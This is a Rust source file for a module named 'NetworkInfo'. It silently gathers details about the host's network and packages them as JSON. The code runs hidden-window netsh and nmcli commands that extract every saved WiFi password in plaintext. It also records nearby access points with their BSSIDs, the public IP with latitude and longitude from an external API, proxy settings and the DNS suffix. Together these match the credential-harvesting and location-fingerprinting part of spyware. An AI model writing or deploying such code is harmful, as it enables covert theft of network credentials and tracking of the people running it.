use std::sync::Mutex;

static GEO_CACHE: Mutex<Option<String>> = Mutex::new(None);

pub struct NetworkInfo;

impl NetworkInfo {
    pub async fn warmup_geo() -> Option<String> {
        {
            let cache = GEO_CACHE.lock().unwrap();
            if let Some(ref cached) = *cache {
                return Some(cached.clone());
            }
        }

        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .build()
            .ok()?;

        let resp = client
            .get("https://uapis.cn/api/v1/network/myip")
            .send()
            .await
            .ok()?;

        let text = resp.text().await.ok()?;

        let mut cache = GEO_CACHE.lock().unwrap();
        *cache = Some(text.clone());
        Some(text)
    }

    pub async fn collect() -> String {
        let wan = Self::collect_wan().await;
        let wifi = Self::collect_wifi();
        let nearby_wifi = Self::collect_wifi_bssid();
        let proxy = Self::collect_proxy();
        let dns_suffix = Self::get_dns_suffix();

        format!(
            r#"{{"interfaces":[],"wan":{},"wifi":{},"nearbyWifi":{},"proxy":{},"dnsSuffix":"{}"}}"#,
            wan, wifi, nearby_wifi, proxy, escape(&dns_suffix)
        )
    }

    async fn collect_wan() -> String {
        let gateway = Self::get_default_gateway();

        let cached = GEO_CACHE.lock().unwrap().clone();
        if let Some(ref geo) = cached {
            let ip = extract_str(geo, "ip").unwrap_or("unavailable");
            let region = extract_str(geo, "region").unwrap_or("").trim().to_string();
            let isp = extract_str(geo, "isp").unwrap_or("");
            let asn = extract_str(geo, "asn").unwrap_or("");
            let llc = extract_str(geo, "llc").unwrap_or("");
            let lat = extract_num(geo, "latitude");
            let lng = extract_num(geo, "longitude");

            return format!(
                r#"{{"publicIp":"{}","gateway":"{}","region":"{}","isp":"{}","asn":"{}","llc":"{}","latitude":{},"longitude":{}}}"#,
                escape(ip),
                escape(&gateway.unwrap_or_else(|| "unknown".into())),
                escape(&region),
                escape(isp),
                escape(asn),
                escape(llc),
                lat,
                lng
            );
        }

        format!(
            r#"{{"publicIp":"{}","gateway":"{}","region":"","isp":"","asn":"","llc":"","latitude":0,"longitude":0}}"#,
            escape("unavailable"),
            escape(&gateway.unwrap_or_else(|| "unknown".into()))
        )
    }

    fn get_default_gateway() -> Option<String> {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let output = std::process::Command::new("wmic")
                .args(["path", "Win32_NetworkAdapterConfiguration", "where", "IPEnabled=TRUE", "get", "DefaultIPGateway", "/format:csv"])
                .creation_flags(0x08000000)
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines().skip(2) {
                let parts: Vec<&str> = line.split(',').collect();
                if parts.len() >= 2 {
                    let gw = parts[1].trim();
                    if !gw.is_empty() && gw != "0.0.0.0" {
                        let first = gw.split(';').next().unwrap_or("").trim();
                        if !first.is_empty() {
                            return Some(first.to_string());
                        }
                    }
                }
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let output = std::process::Command::new("ip")
                .args(["route", "show", "default"])
                .output()
                .ok()?;
            let text = String::from_utf8_lossy(&output.stdout);
            for line in text.lines() {
                if line.contains("default") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        return Some(parts[2].to_string());
                    }
                }
            }
        }
        None
    }

    /// Collect saved WiFi profiles with passwords.
    /// Locale-independent: parses by position (value after last `:` on profile lines)
    fn collect_wifi() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;

            // Step 1: Get profile names
            let profiles_output = std::process::Command::new("netsh")
                .args(["wlan", "show", "profiles"])
                .creation_flags(0x08000000)
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            let mut profile_names = Vec::new();
            let mut past_separator = false;
            for line in profiles_output.lines() {
                let trimmed = line.trim();
                if trimmed.contains("---") {
                    past_separator = true;
                    continue;
                }
                if !past_separator { continue; }
                // Profile lines have format: "    <label> : <profile_name>"
                // Extract value after the LAST colon
                if let Some(colon_pos) = trimmed.rfind(':') {
                    let value = trimmed[colon_pos + 1..].trim();
                    if !value.is_empty() {
                        profile_names.push(value.to_string());
                    }
                }
            }

            // Step 2: Get password for each profile
            let mut profiles = Vec::new();
            for name in &profile_names {
                if let Ok(output) = std::process::Command::new("netsh")
                    .args(["wlan", "show", "profile", &format!("name={}", name), "key=clear"])
                    .creation_flags(0x08000000)
                    .output()
                {
                    let detail = String::from_utf8_lossy(&output.stdout);
                    let mut password = String::new();
                    for line in detail.lines() {
                        let t = line.trim();
                        // Match both English "Key Content" and Chinese "密钥内容"
                        // Also match by position: it's the field containing "key" (case-insensitive) or "密钥"
                        let lower = t.to_lowercase();
                        if (lower.contains("key content") || t.contains("密钥内容"))
                            && t.contains(':')
                        {
                            password = t.splitn(2, ':').nth(1).unwrap_or("").trim().to_string();
                            break;
                        }
                    }
                    profiles.push(format!(
                        r#"{{"ssid":"{}","password":"{}"}}"#,
                        escape(name), escape(&password)
                    ));
                }
            }
            return format!("[{}]", profiles.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Linux: try nmcli
            let mut profiles = Vec::new();
            if let Ok(output) = std::process::Command::new("nmcli")
                .args(["-t", "-f", "NAME,TYPE", "connection", "show"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let parts: Vec<&str> = line.split(':').collect();
                    if parts.len() >= 2 && parts[1].contains("wireless") {
                        let ssid = parts[0];
                        let mut password = String::new();
                        if let Ok(detail) = std::process::Command::new("nmcli")
                            .args(["-s", "-t", "-f", "802-11-wireless-security.psk", "connection", "show", ssid])
                            .output()
                        {
                            let pw_text = String::from_utf8_lossy(&detail.stdout);
                            for pw_line in pw_text.lines() {
                                if let Some(val) = pw_line.strip_prefix("802-11-wireless-security.psk:") {
                                    password = val.to_string();
                                }
                            }
                        }
                        profiles.push(format!(
                            r#"{{"ssid":"{}","password":"{}"}}"#,
                            escape(ssid), escape(&password)
                        ));
                    }
                }
            }
            return format!("[{}]", profiles.join(","));
        }
    }

    /// Scan nearby WiFi access points via netsh.
    /// Locale-independent: uses SSID/BSSID as anchors (universal), plus bilingual matching for auth/signal.
    fn collect_wifi_bssid() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            let output = std::process::Command::new("netsh")
                .args(["wlan", "show", "networks", "mode=bssid"])
                .creation_flags(0x08000000)
                .output()
                .ok()
                .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
                .unwrap_or_default();

            // Split by "SSID " which is universal across locales
            let sections: Vec<&str> = output.split("SSID ").collect();
            let mut networks = Vec::new();

            for section in sections.iter().skip(1) {
                let lines: Vec<&str> = section.lines().collect();
                if lines.is_empty() { continue; }

                // First line format: "<num> : <ssid_name>"
                let first_line = lines[0];
                let ssid = match first_line.find(':') {
                    Some(i) => first_line[i + 1..].trim(),
                    None => continue,
                };
                if ssid.is_empty() { continue; }

                let mut auth = String::new();
                let mut encryption = String::new();
                let mut current_bssid = String::new();

                for line in &lines[1..] {
                    let t = line.trim();
                    let lower = t.to_lowercase();

                    // Authentication: "Authentication" (EN) or "身份验证" (CN)
                    if lower.starts_with("authentication") || t.starts_with("身份验证")
                        || lower.contains("authentication") && t.contains(':')
                    {
                        if !lower.starts_with("bssid") {
                            if let Some(val) = extract_after_colon(t) {
                                auth = val.to_string();
                            }
                        }
                    }
                    // Encryption: "Encryption" (EN) or "加密" (CN)
                    else if lower.starts_with("encryption") || lower.starts_with("cipher")
                        || t.starts_with("加密")
                    {
                        if let Some(val) = extract_after_colon(t) {
                            encryption = val.to_string();
                        }
                    }
                    // BSSID is universal
                    else if lower.starts_with("bssid") || t.starts_with("BSSID") {
                        if let Some(val) = extract_after_colon(t) {
                            current_bssid = val.to_string();
                        }
                    }
                    // Signal: "Signal" (EN) or "信号" (CN)
                    else if lower.starts_with("signal") || t.starts_with("信号") {
                        if let Some(val) = extract_after_colon(t) {
                            let signal = val.replace('%', "").trim().to_string();
                            if !current_bssid.is_empty() {
                                networks.push(format!(
                                    r#"{{"ssid":"{}","auth":"{}","encryption":"{}","bssid":"{}","signal":"{}"}}"#,
                                    escape(ssid), escape(&auth), escape(&encryption),
                                    escape(&current_bssid), escape(&signal)
                                ));
                            }
                        }
                    }
                    // Network type / 网络类型 — skip
                    // Channel / 频道 — skip
                }
            }
            return format!("[{}]", networks.join(","));
        }
        #[cfg(not(target_os = "windows"))]
        {
            // Linux: try iwlist or nmcli
            let mut networks = Vec::new();
            if let Ok(output) = std::process::Command::new("nmcli")
                .args(["-t", "-f", "SSID,BSSID,SIGNAL,SECURITY", "device", "wifi", "list"])
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    let parts: Vec<&str> = line.split(':').collect();
                    // nmcli -t uses \: for escaped colons in BSSID, handle carefully
                    // Better: use field separator that doesn't conflict
                    if parts.len() >= 4 {
                        let ssid = parts[0].replace("\\:", ":");
                        // BSSID is parts[1..7] joined (6 hex pairs with :)
                        let bssid_parts = &parts[1..7.min(parts.len())];
                        let bssid = bssid_parts.join(":").replace("\\", "");
                        let signal = parts.get(7).unwrap_or(&"0");
                        let security = parts.get(8).unwrap_or(&"");
                        networks.push(format!(
                            r#"{{"ssid":"{}","auth":"{}","encryption":"","bssid":"{}","signal":"{}"}}"#,
                            escape(&ssid), escape(security), escape(&bssid), escape(signal)
                        ));
                    }
                }
            }
            // Fallback: try iwlist
            if networks.is_empty() {
                if let Ok(output) = std::process::Command::new("iwlist")
                    .args(["scan"])
                    .output()
                {
                    let text = String::from_utf8_lossy(&output.stdout);
                    let mut ssid = String::new();
                    let mut bssid = String::new();
                    let mut signal = String::new();
                    let mut enc = String::new();

                    for line in text.lines() {
                        let t = line.trim();
                        if t.starts_with("Cell ") {
                            if !ssid.is_empty() || !bssid.is_empty() {
                                networks.push(format!(
                                    r#"{{"ssid":"{}","auth":"","encryption":"{}","bssid":"{}","signal":"{}"}}"#,
                                    escape(&ssid), escape(&enc), escape(&bssid), escape(&signal)
                                ));
                            }
                            ssid.clear(); signal.clear(); enc.clear();
                            if let Some(addr) = t.split("Address:").nth(1) {
                                bssid = addr.trim().to_string();
                            }
                        } else if t.starts_with("ESSID:") {
                            ssid = t.trim_start_matches("ESSID:").trim_matches('"').to_string();
                        } else if t.contains("Signal level") {
                            if let Some(s) = t.split("Signal level=").nth(1) {
                                signal = s.split_whitespace().next().unwrap_or("").to_string();
                            }
                        } else if t.starts_with("Encryption key:") {
                            enc = t.trim_start_matches("Encryption key:").to_string();
                        }
                    }
                    if !ssid.is_empty() || !bssid.is_empty() {
                        networks.push(format!(
                            r#"{{"ssid":"{}","auth":"","encryption":"{}","bssid":"{}","signal":"{}"}}"#,
                            escape(&ssid), escape(&enc), escape(&bssid), escape(&signal)
                        ));
                    }
                }
            }
            return format!("[{}]", networks.join(","));
        }
    }

    fn collect_proxy() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("reg")
                .args(["query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout).to_uppercase();
                let enabled = text.contains("PROXYENABLE") && text.contains("0X1");
                let server = {
                    let search = "PROXYSERVER";
                    if let Some(pos) = text.find(search) {
                        let rest = &text[pos + search.len()..];
                        if let Some(reg_pos) = rest.find("REG_SZ") {
                            rest[reg_pos + 6..].lines().next().unwrap_or("").trim().to_string()
                        } else {
                            String::new()
                        }
                    } else {
                        String::new()
                    }
                };

                let port: u16 = if let Some(colon) = server.rfind(':') {
                    server[colon + 1..].parse().unwrap_or(0)
                } else { 0 };

                return format!(
                    r#"{{"enabled":{},"server":"{}","port":{},"bypass":""}}"#,
                    enabled, escape(&server), port
                );
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            let http_proxy = std::env::var("HTTP_PROXY")
                .or_else(|_| std::env::var("http_proxy"))
                .unwrap_or_default();
            let https_proxy = std::env::var("HTTPS_PROXY")
                .or_else(|_| std::env::var("https_proxy"))
                .unwrap_or_default();
            let all_proxy = if !https_proxy.is_empty() { &https_proxy } else { &http_proxy };
            let enabled = !all_proxy.is_empty();

            return format!(
                r#"{{"enabled":{},"server":"{}","port":0,"bypass":""}}"#,
                enabled, escape(all_proxy)
            );
        }
        #[allow(unreachable_code)]
        r#"{"enabled":false,"server":"","port":0,"bypass":""}"#.to_string()
    }

    fn get_dns_suffix() -> String {
        #[cfg(target_os = "windows")]
        {
            use std::os::windows::process::CommandExt;
            if let Ok(output) = std::process::Command::new("ipconfig")
                .args(["/all"])
                .creation_flags(0x08000000)
                .output()
            {
                let text = String::from_utf8_lossy(&output.stdout);
                for line in text.lines() {
                    // Match both "DNS Suffix" (EN) and "DNS 后缀" (CN)
                    let lower = line.to_lowercase();
                    if (lower.contains("dns suffix") || lower.contains("dns 后缀"))
                        && line.contains(':')
                    {
                        return line.split(':').nth(1).unwrap_or("").trim().to_string();
                    }
                }
            }
        }
        String::new()
    }
}

fn extract_str<'a>(json: &'a str, key: &str) -> Option<&'a str> {
    let search = format!("\"{}\":\"", key);
    let start = json.find(&search)?;
    let start = start + search.len();
    let end = json[start..].find('"')?;
    Some(&json[start..start + end])
}

fn extract_num(json: &str, key: &str) -> String {
    let search = format!("\"{}\":", key);
    let start = match json.find(&search) {
        Some(s) => s + search.len(),
        None => return "0".into(),
    };
    let rest = &json[start..];
    let end = rest.find(|c: char| !c.is_ascii_digit() && c != '.' && c != '-').unwrap_or(rest.len());
    if end > 0 { rest[..end].to_string() } else { "0".into() }
}

fn extract_after_colon(s: &str) -> Option<&str> {
    s.find(':').map(|i| s[i + 1..].trim())
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
}
